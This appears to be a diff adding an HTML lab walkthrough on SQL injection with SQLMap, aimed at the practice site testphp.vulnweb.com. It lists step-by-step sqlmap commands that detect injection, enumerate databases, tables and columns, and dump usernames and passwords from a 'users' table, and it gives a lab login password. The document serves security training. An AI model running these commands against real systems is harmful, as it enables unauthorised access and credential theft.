@@ -1,0 +1,88 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>SQL Injection using SQLMap</title>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            line-height: 1.6;
+            background-color: #f4f4f4;
+            margin: 0;
+            padding: 20px;
+        }
+        .container {
+            background-color: white;
+            padding: 20px;
+            border-radius: 5px;
+            box-shadow: 0 0 10px rgba(0, 0, 0, 0.1);
+        }
+        code {
+            background-color: #f0f0f0;
+            padding: 5px;
+            border-radius: 5px;
+        }
+        pre {
+            background-color: #f0f0f0;
+            padding: 10px;
+            border-radius: 5px;
+            white-space: pre-wrap;
+        }
+        h2, h3 {
+            color: #333;
+        }
+        img {
+            max-width: 100%;
+            height: auto;
+            border: 1px solid #ddd;
+            border-radius: 5px;
+            margin-top: 10px;
+        }
+    </style>
+</head>
+<body>
+<div class="container">
+    <h2>SQL Injection using SQLMap</h2>
+    
+    <h3>Step 1: Login to Both Systems</h3>
+    <ul>
+        <li><strong>Attacker System:</strong> Password: <code>VSecureSphere</code></li>
+        <li><strong>Victim System:</strong> Password: <code>VSecureSphere</code></li>
+    </ul>
+
+    <h3>Step 2: View SQLMap Help Command</h3>
+    <pre><code>sqlmap -h</code></pre>
+    <img src="SQLMap_SS/sqlmap_help.png" alt="SQLMap Help Command Output">
+
+    <h3>Step 3: Test for SQL Injection</h3>
+    <pre><code>sqlmap -u "http://testphp.vulnweb.com/artists.php?artist=1"</code></pre>
+    <img src="SQLMap_SS/sqlmap_test.png" alt="Testing SQL Injection">
+
+    <h3>Step 4: List Available Databases</h3>
+    <pre><code>sqlmap -u "http://testphp.vulnweb.com/listproducts.php?cat=1" --dbs</code></pre>
+    <img src="SQLMap_SS/sqlmap_dbs1.png" alt="List of databases">
+    <img src="SQLMap_SS/sqlmap_dbs2.png" alt="List of databases">
+
+    <h3>Step 5: List Tables in a Database</h3>
+    <pre><code>sqlmap -u "http://testphp.vulnweb.com/listproducts.php?cat=1" -D acuart --tables</code></pre>
+    <img src="SQLMap_SS/sqlmap_tables1.png" alt="List of tables">
+    <img src="SQLMap_SS/sqlmap_tables2.png" alt="List of tables">
+
+    <h3>Step 6: Identify Columns in the 'users' Table</h3>
+    <pre><code>sqlmap -u "http://testphp.vulnweb.com/listproducts.php?cat=1" -D acuart -T users --columns</code></pre>
+    <img src="SQLMap_SS/sqlmap_column1.png" alt="List of columns">
+    <img src="SQLMap_SS/sqlmap_column2.png" alt="List of columns">
+
+    <h3>Step 7: Extract Usernames from 'users' Table</h3>
+    <pre><code>sqlmap -u "http://testphp.vulnweb.com/listproducts.php?cat=1" -D acuart -T users -C name --dump</code></pre>
+    <img src="SQLMap_SS/sqlmap_usernames1.png" alt="Extracted usernames">
+    <img src="SQLMap_SS/sqlmap_usernames2.png" alt="Extracted usernames">
+
+    <h3>Step 8: Extract Passwords from 'users' Table</h3>
+    <pre><code>sqlmap -u "http://testphp.vulnweb.com/listproducts.php?cat=1" -D acuart -T users -C pass --dump</code></pre>
+    <img src="SQLMap_SS/sqlmap_passwords1.png" alt="Extracted passwords">
+    <img src="SQLMap_SS/sqlmap_passwords2.png" alt="Extracted passwords">
+</div>
+</body>
+</html>
